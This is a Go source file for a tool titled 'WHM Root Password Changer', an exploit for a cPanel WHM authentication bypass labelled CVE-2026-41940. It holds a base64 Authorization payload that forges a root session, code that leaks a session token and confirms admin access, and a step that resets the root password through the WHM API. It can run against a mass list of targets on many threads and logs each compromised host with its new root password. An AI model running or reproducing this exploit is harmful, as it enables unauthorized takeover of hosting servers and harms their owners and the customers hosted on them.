//go:build ignore

package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	ResultDir       = "Result"
	ResultFile      = "Result/result.txt"
	CheckManualFile = "Result/check_manually.txt"

	// Decoded: root:x\r\nsuccessful_internal_auth_with_timestamp=9999999999\r\nuser=root\r\ntfa_verified=1\r\nhasroot=1
	PayloadB64 = "cm9vdDp4DQpzdWNjZXNzZnVsX2ludGVybmFsX2F1dGhfd2l0aF90aW1lc3RhbXA9OTk5" +
		"OTk5OTk5OQ0KdXNlcj1yb290DQp0ZmFfdmVyaWZpZWQ9MQ0KaGFzcm9vdD0x"
)

var (
	Green  = "\033[92m"
	Red    = "\033[91m"
	Yellow = "\033[93m"
	Blue   = "\033[94m"
	Cyan   = "\033[36m"
	White  = "\033[97m"
	Reset  = "\033[0m"
	Bold   = "\033[1m"

	cpsessRegex    = regexp.MustCompile(`/cpsess\d{10}`)
	canonicalRegex = regexp.MustCompile(`^https?://([^:/]+)`)
)

// ================== BANNER ==================

func PrintBanner() {
	banner := `
 _   _             _____           _
| | | |           |_   _|         | |
| |_| |_  ___ __    | | ___   ___ | |___
|  _  \ \/ / '__|   | |/ _ \ / _ \| / __|
| | | |>  <| |      | | (_) | (_) | \__ \
\_| |_/_/\_\_|      \_/\___/ \___/|_|___/
	WHM Root Password Changer v1.1
               by @willygoid
`
	fmt.Println(banner)
}

// ================== STICKY PROGRESS BAR ==================

type StickyBar struct {
	total    int
	current  int
	barWidth int
	threads  int
	mu       sync.Mutex
}

func newStickyBar(total, threads int) *StickyBar {
	return &StickyBar{total: total, barWidth: 50, threads: threads}
}

func (b *StickyBar) render() {
	pct := 0.0
	filled := 0
	if b.total > 0 {
		pct = float64(b.current) / float64(b.total) * 100
		filled = int(float64(b.barWidth) * float64(b.current) / float64(b.total))
	}
	bar := strings.Repeat("█", filled) + strings.Repeat("░", b.barWidth-filled)
	fmt.Printf("\r\033[K%s CVE-2026-41940 WHM Auth Bypass by @willygoid | Threads: %d %s\n",
		Cyan+Bold, b.threads, Reset)
	fmt.Printf("\r\033[K%s[%s] %d/%d (%.0f%%)%s",
		White+Bold, bar, b.current, b.total, pct, Reset)
}

func (b *StickyBar) Init() {
	b.mu.Lock()
	defer b.mu.Unlock()
	b.render()
}

func (b *StickyBar) Increment(result string) {
	b.mu.Lock()
	defer b.mu.Unlock()
	fmt.Printf("\033[1A\r\033[K%s\n", result)
	b.current++
	b.render()
}

func (b *StickyBar) Finish() {
	b.mu.Lock()
	defer b.mu.Unlock()
	b.current = b.total
	fmt.Printf("\033[1A\r\033[K")
	b.render()
	fmt.Println()
}

// ================== HELPERS ==================

func friendlyError(err error) string {
	msg := err.Error()
	switch {
	case strings.Contains(msg, "context deadline exceeded"),
		strings.Contains(msg, "Client.Timeout"),
		strings.Contains(msg, "i/o timeout"):
		return "timeout"
	case strings.Contains(msg, "connection refused"):
		return "connection refused"
	case strings.Contains(msg, "no such host"),
		strings.Contains(msg, "Name or service not known"),
		strings.Contains(msg, "nodename nor servname"):
		return "host not found"
	case strings.Contains(msg, "connection reset"),
		strings.Contains(msg, "EOF"):
		return "connection reset"
	case strings.Contains(msg, "tls:"),
		strings.Contains(msg, "certificate"),
		strings.Contains(msg, "x509"):
		return "TLS error"
	case strings.Contains(msg, "no route to host"),
		strings.Contains(msg, "network is unreachable"):
		return "unreachable"
	default:
		if idx := strings.LastIndex(msg, ": "); idx != -1 {
			return msg[idx+2:]
		}
		return msg
	}
}

func generatePassword(length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

func newHTTPClient(timeout time.Duration) *http.Client {
	return &http.Client{
		Transport: &http.Transport{
			TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
			DisableKeepAlives: true,
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Timeout: timeout,
	}
}

func doRequest(client *http.Client, method, scheme, host string, port int, canonical, path string, headers map[string]string, body io.Reader) (*http.Response, error) {
	req, err := http.NewRequest(method, fmt.Sprintf("%s://%s:%d%s", scheme, host, port, path), body)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Host", fmt.Sprintf("%s:%d", canonical, port))
	req.Header.Set("Connection", "close")
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	return client.Do(req)
}

func drainAndClose(resp *http.Response) {
	if resp != nil {
		io.ReadAll(resp.Body)
		resp.Body.Close()
	}
}

// ================== TARGET PARSER ==================

type ParsedTarget struct {
	Scheme string
	Host   string
	Port   int
}

func parseTarget(raw string) (*ParsedTarget, error) {
	raw = strings.TrimSpace(strings.TrimRight(raw, "/"))

	if !strings.HasPrefix(raw, "http://") && !strings.HasPrefix(raw, "https://") {
		if idx := strings.LastIndex(raw, ":"); idx != -1 {
			portStr := raw[idx+1:]
			p, err := strconv.Atoi(portStr)
			if err != nil {
				return nil, fmt.Errorf("invalid port: %s", portStr)
			}
			return &ParsedTarget{
				Scheme: "https",
				Host:   strings.ReplaceAll(raw[:idx], "www.", ""),
				Port:   p,
			}, nil
		}
		return &ParsedTarget{
			Scheme: "https",
			Host:   strings.ReplaceAll(raw, "www.", ""),
			Port:   2087,
		}, nil
	}

	u, err := url.Parse(raw)
	if err != nil {
		return nil, err
	}
	scheme := u.Scheme
	if scheme == "" {
		scheme = "https"
	}
	host := strings.ReplaceAll(u.Hostname(), "www.", "")
	port := 2087
	if u.Port() != "" {
		port, _ = strconv.Atoi(u.Port())
	}
	return &ParsedTarget{Scheme: scheme, Host: host, Port: port}, nil
}

// ================== EXPLOIT ==================

type ExploitResult struct {
	Vulnerable bool
	TargetURL  string
	Token      string
	Session    string
	Canonical  string
	Scheme     string
	Host       string
	Port       int
	Reason     string
}

func discoverCanonicalHost(client *http.Client, scheme, host string, port int) string {
	req, err := http.NewRequest("GET",
		fmt.Sprintf("%s://%s:%d/openid_connect/cpanelid", scheme, host, port), nil)
	if err != nil {
		return host
	}
	req.Header.Set("Host", fmt.Sprintf("%s:%d", host, port))
	req.Header.Set("Connection", "close")

	resp, err := client.Do(req)
	if err != nil {
		return host
	}
	drainAndClose(resp)

	m := canonicalRegex.FindStringSubmatch(resp.Header.Get("Location"))
	if len(m) > 1 {
		return m[1]
	}
	return host
}

func checkAndExploit(target string) *ExploitResult {
	pt, err := parseTarget(target)
	if err != nil {
		return &ExploitResult{TargetURL: target, Reason: err.Error()}
	}

	targetURL := fmt.Sprintf("%s://%s:%d", pt.Scheme, pt.Host, pt.Port)
	client := newHTTPClient(15 * time.Second)
	canonical := discoverCanonicalHost(client, pt.Scheme, pt.Host, pt.Port)

	// Stage 1: POST login to obtain session cookie
	resp, err := doRequest(client, "POST", pt.Scheme, pt.Host, pt.Port, canonical,
		"/login/?login_only=1",
		map[string]string{"Content-Type": "application/x-www-form-urlencoded"},
		strings.NewReader("user=root&pass=wrong"),
	)
	if err != nil {
		return &ExploitResult{TargetURL: targetURL, Reason: friendlyError(err)}
	}
	setCookies := resp.Header["Set-Cookie"]
	drainAndClose(resp)

	var cookieValue string
	for _, sc := range setCookies {
		if idx := strings.Index(sc, "whostmgrsession="); idx != -1 {
			val := sc[idx+len("whostmgrsession="):]
			if semi := strings.Index(val, ";"); semi != -1 {
				val = val[:semi]
			}
			if decoded, err := url.QueryUnescape(val); err == nil {
				cookieValue = decoded
			} else {
				cookieValue = val
			}
			break
		}
	}
	if cookieValue == "" {
		return &ExploitResult{TargetURL: targetURL, Reason: "not WHM"}
	}

	sessionBase := cookieValue
	if idx := strings.Index(cookieValue, ","); idx != -1 {
		sessionBase = cookieValue[:idx]
	}
	cookieEnc := url.QueryEscape(sessionBase)

	// Stage 2: GET / with auth bypass payload to leak cpsess token
	resp, err = doRequest(client, "GET", pt.Scheme, pt.Host, pt.Port, canonical, "/",
		map[string]string{
			"Authorization": "Basic " + PayloadB64,
			"Cookie":        "whostmgrsession=" + cookieEnc,
		}, nil,
	)
	if err != nil {
		return &ExploitResult{TargetURL: targetURL, Reason: friendlyError(err)}
	}
	location := resp.Header.Get("Location")
	statusCode := resp.StatusCode
	drainAndClose(resp)

	token := cpsessRegex.FindString(location)
	if token == "" {
		return &ExploitResult{
			TargetURL: targetURL,
			Reason:    fmt.Sprintf("not vulnerable (HTTP %d)", statusCode),
		}
	}

	// Stage 3: fire do_token_denied to propagate raw -> cache
	// Must return HTTP 401 with "Token denied" or "WHM Login" to confirm exploit chain fired.
	resp, _ = doRequest(client, "GET", pt.Scheme, pt.Host, pt.Port, canonical,
		"/scripts2/listaccts",
		map[string]string{"Cookie": "whostmgrsession=" + cookieEnc},
		nil,
	)
	if resp == nil {
		return &ExploitResult{TargetURL: targetURL, Reason: "stage3 no response"}
	}
	stage3Body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	stage3Code := resp.StatusCode
	stage3BodyStr := string(stage3Body)
	if stage3Code != 401 || (!strings.Contains(stage3BodyStr, "Token denied") && !strings.Contains(stage3BodyStr, "WHM Login")) {
		return &ExploitResult{
			TargetURL: targetURL,
			Reason:    fmt.Sprintf("not vulnerable (stage3 HTTP %d)", stage3Code),
		}
	}

	// Stage 4: Verify authenticated access
	client20 := newHTTPClient(20 * time.Second)
	resp, err = doRequest(client20, "GET", pt.Scheme, pt.Host, pt.Port, canonical,
		token+"/json-api/version",
		map[string]string{"Cookie": "whostmgrsession=" + cookieEnc},
		nil,
	)
	if err != nil {
		return &ExploitResult{TargetURL: targetURL, Reason: friendlyError(err)}
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()

	code := resp.StatusCode
	bodyStr := string(body)
	// 500/503 only counts as success when body mentions "License" (license-gated but auth passed)
	if (code == 200 && strings.Contains(bodyStr, `"version"`)) ||
		((code == 500 || code == 503) && strings.Contains(bodyStr, "License")) {
		return &ExploitResult{
			Vulnerable: true,
			TargetURL:  targetURL,
			Token:      token,
			Session:    sessionBase,
			Canonical:  canonical,
			Scheme:     pt.Scheme,
			Host:       pt.Host,
			Port:       pt.Port,
		}
	}

	return &ExploitResult{TargetURL: targetURL, Reason: "not vulnerable"}
}

func changeRootPassword(result *ExploitResult, password string) bool {
	client := newHTTPClient(20 * time.Second)
	cookieEnc := url.QueryEscape(result.Session)
	qs := fmt.Sprintf("api.version=1&user=root&password=%s", url.QueryEscape(password))

	resp, err := doRequest(client, "GET", result.Scheme, result.Host, result.Port, result.Canonical,
		result.Token+"/json-api/passwd?"+qs,
		map[string]string{"Cookie": "whostmgrsession=" + cookieEnc},
		nil,
	)
	if err != nil {
		return false
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	code := resp.StatusCode
	bodyStr := string(body)
	return code == 200 || ((code == 500 || code == 503) && strings.Contains(bodyStr, "License"))
}

// ================== FILE OUTPUT ==================

func saveResult(scheme, host string, port int, username, password string, mu *sync.Mutex) {
	mu.Lock()
	defer mu.Unlock()
	f, err := os.OpenFile(ResultFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	fmt.Fprintf(f, "%s://%s:%d#%s|%s\n", scheme, host, port, username, password)
}

func saveCheckManual(targetURL string, mu *sync.Mutex) {
	mu.Lock()
	defer mu.Unlock()
	f, err := os.OpenFile(CheckManualFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	fmt.Fprintln(f, targetURL)
}

// ================== SCAN WORKER ==================

func exploitTarget(target, password string, bar *StickyBar, fileMu *sync.Mutex) {
	result := checkAndExploit(target)

	if !result.Vulnerable {
		bar.Increment(fmt.Sprintf("%s[-] %-45s → %s%s",
			Red, result.TargetURL, result.Reason, Reset))
		return
	}

	if changeRootPassword(result, password) {
		saveResult(result.Scheme, result.Host, result.Port, "root", password, fileMu)
		bar.Increment(fmt.Sprintf("%s[+] %-45s → root:%s%s",
			Green+Bold, result.TargetURL, password, Reset))
	} else {
		saveCheckManual(result.TargetURL, fileMu)
		bar.Increment(fmt.Sprintf("%s[!] %-45s → VULNERABLE but passwd change failed%s",
			Yellow, result.TargetURL, Reset))
	}
}

// ================== INPUT ==================

func loadFile(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var lines []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}

func interactiveMode() (targets []string, password string, threads int) {
	reader := bufio.NewReader(os.Stdin)
	readLine := func(prompt string) string {
		fmt.Print(Blue + prompt + Reset)
		line, _ := reader.ReadString('\n')
		return strings.TrimSpace(line)
	}
	mode := readLine("[?] Pilih mode (1 = Single Target | 2 = Mass dari TXT): ")

	switch mode {
	case "1":
		t := readLine("[?] Target (contoh: target.com atau https://target.com:2087): ")
		targets = []string{t}
	case "2":
		fileName := readLine("[?] File target (default: targets.txt): ")
		if fileName == "" {
			fileName = "targets.txt"
		}
		var err error
		targets, err = loadFile(fileName)
		if err != nil {
			fmt.Printf("%s[!] Gagal membaca %s: %v%s\n", Red, fileName, err, Reset)
			os.Exit(1)
		}
		fmt.Printf("%s[+] Loaded %d targets dari %s%s\n", Green, len(targets), fileName, Reset)
	default:
		fmt.Printf("%s[!] Pilihan tidak valid.%s\n", Red, Reset)
		os.Exit(1)
	}

	threadsStr := readLine("[?] Jumlah threads (default 10): ")
	threads = 10
	if n, err := strconv.Atoi(threadsStr); err == nil && n > 0 {
		threads = n
	}

	password = readLine("[?] Password root baru (kosongkan untuk random): ")
	if password == "" {
		password = generatePassword(16)
		fmt.Printf("%s[+] Password random: %s%s\n", Green, password, Reset)
	}

	return
}

// ================== MAIN ==================

func main() {
	log.SetOutput(io.Discard)
	PrintBanner()

	targetFlag := flag.String("t", "", "Single target")
	targetsFlag := flag.String("T", "", "File berisi list target")
	passwordFlag := flag.String("p", "", "Password root baru")
	threadsFlag := flag.Int("threads", 10, "Jumlah thread")
	flag.Parse()

	var targets []string
	var password string
	var threads int

	if *targetFlag != "" || *targetsFlag != "" {
		if *targetFlag != "" {
			targets = []string{*targetFlag}
		} else {
			var err error
			targets, err = loadFile(*targetsFlag)
			if err != nil {
				fmt.Printf("%s[!] Gagal membaca %s: %v%s\n", Red, *targetsFlag, err, Reset)
				os.Exit(1)
			}
		}
		password = *passwordFlag
		if password == "" {
			password = generatePassword(16)
		}
		threads = *threadsFlag
	} else {
		targets, password, threads = interactiveMode()
	}

	if len(targets) == 0 {
		fmt.Printf("%s[!] Tidak ada target yang valid.%s\n", Red, Reset)
		os.Exit(1)
	}

	os.MkdirAll(ResultDir, 0755)

	fmt.Printf("\n%s[+] %d targets | %d threads | password: %s%s\n\n",
		Green+Bold, len(targets), threads, password, Reset)

	bar := newStickyBar(len(targets), threads)
	bar.Init()

	var wg sync.WaitGroup
	var fileMu sync.Mutex
	sem := make(chan struct{}, threads)

	for _, target := range targets {
		wg.Add(1)
		sem <- struct{}{}
		go func(t string) {
			defer wg.Done()
			defer func() { <-sem }()
			exploitTarget(t, password, bar, &fileMu)
		}(target)
	}

	wg.Wait()
	bar.Finish()

	fmt.Println()
	fmt.Println(Cyan + strings.Repeat("═", 60) + Reset)
	fmt.Printf("%s[+] Scan selesai!%s\n", Green+Bold, Reset)
	fmt.Printf("%s[+] Hasil disimpan di  : %s%s\n", Green, ResultFile, Reset)
	fmt.Printf("%s[!] Check manual       : %s%s\n", Yellow, CheckManualFile, Reset)
	fmt.Println(Cyan + strings.Repeat("═", 60) + Reset)
}
